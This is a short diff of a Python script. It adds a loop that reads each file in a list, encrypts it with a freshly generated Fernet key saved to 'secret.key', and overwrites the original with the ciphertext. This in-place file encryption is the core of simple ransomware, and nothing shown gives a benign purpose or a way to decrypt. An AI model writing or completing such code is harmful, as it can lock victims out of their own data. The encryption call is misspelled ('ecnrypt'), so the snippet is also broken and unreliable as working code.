@@ -18,3 +18,10 @@ key = Fernet.generate_key()
 
 with open("secret.key","wb") as secret:
     secret.write(key)
+
+for file in files:
+    with open(file,"rb") as thefile:
+        contents = thefile.read()
+    contents_encrypt = Fernet(key).ecnrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypt)
